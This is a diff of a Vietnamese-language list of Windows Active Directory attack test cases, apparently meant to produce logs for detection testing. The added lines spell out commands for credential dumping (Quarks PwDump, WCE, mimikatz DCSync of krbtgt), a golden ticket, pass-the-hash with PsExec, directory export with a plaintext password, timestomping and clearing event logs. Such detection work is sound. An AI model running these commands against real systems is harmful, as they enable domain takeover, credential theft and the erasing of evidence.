@@ -91,10 +91,33 @@ Invoke-Command -ComputerName "winsrv" -ScriptBlock { Get-ChildItem C:\ } -Creden
   * `winlog.event_data.ObjectName: libeay32.dll`
   * `message: Accesses: Execute/Traverse`
 
+
 ## Test case 8: Quarks PwDump
+* Command: 
+```
+.\QuarksPwDump.exe
+quarkspwdump.exe --dump-hash-domain-cached
+```
+
+
 ## Test case 9: WCE Password and Hash dump
+* Command: `.\wce64.exe`
+
+
 ## Test case 10: WCE Remote Login
+* Command: `.\wce64.exe -s [UserAccount]:[Domain]:[NTLM]`
+* Ví dụ: `.\wce64.exe -s sv:WINSRV2008:00000000000000000000000000000000:130B0F15BFF820D1DFDE026CD3554719`
+
 ## Test case 11: Golden Ticket
+* Command: 
+ * Vào mimikatz: `.\mimikatz.exe`
+ * Lấy NTLM của Krbtgt: `lsadump::dcsync /domain:dc01.local /user:krbtgt`
+ * Tiến hành tạo ticket và pass-the-ticket này vào current logon session: `kerberos::golden /domain:winsrv2008.local /sid:S-1-5-21-4220747943-3152432350-320651364 /rc4:e7111664b88b4b058010fde4aa37fec1 /id:500 /user:FakeAdmin /ptt`
+ * Có thể sử dụng misc::cmd để mở một cmd mới hoặc exit rồi sử dụng cmd hiện tại. Pass-the-hash:
+  * `net use O: \\winsrv\c$`
+  * `pushd \\winsrv\c$`
+  * `.\PsExec64.exe \\winsrv cmd`
+
 ## Test case 12: AT Command
 * Command: `at.exe \\192.168.255.100 10:00 cmd /c ping 8.8.8.8`
 
@@ -129,14 +152,18 @@ cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.di
 
 ## Test case 18: net user
 ## Test case 19: csvde
-* Command: `.\csvde.exe -f C:\Users\sv\Desktop\adusers.csv -s 192.168.255.100 -r objectClass=user -b [user] [domain] [Password]`
+* Command: `.\csvde.exe -f [filename] -s [hostname/IP] -r objectClass=user -b [UserAccount] [Domain] [Password]`
 * Ví dụ: `.\csvde.exe -f C:\Users\sv\Desktop\adusers.csv -s 192.168.255.100 -r objectClass=user -b sv WINSRV2008 123456sv.`
 
 ## Test case 20: ldifde
+* Command: `ldifde.exe -f [filename] -s [hostname/IP] -b [UserAccount] [Domain] [Password]` 
+* Ví dụ: `ldifde.exe -f adusers.ldif -s 192.168.255.100 -b sv WINSRV2008 123456sv.`
+
 ## Test case 21: timestomp
+* Command: `timestomp -z “timestamp” [filename]` 
+* Ví dụ: `timestomp -z “01/01/2000 09:09:09” credentials.txt`
 
 
 ## Test case 22: wevtutil
-Command:
-
-
+* Command: `wevtutl cl [Tên log]`
+* Ví dụ: `wevtutil cl application`
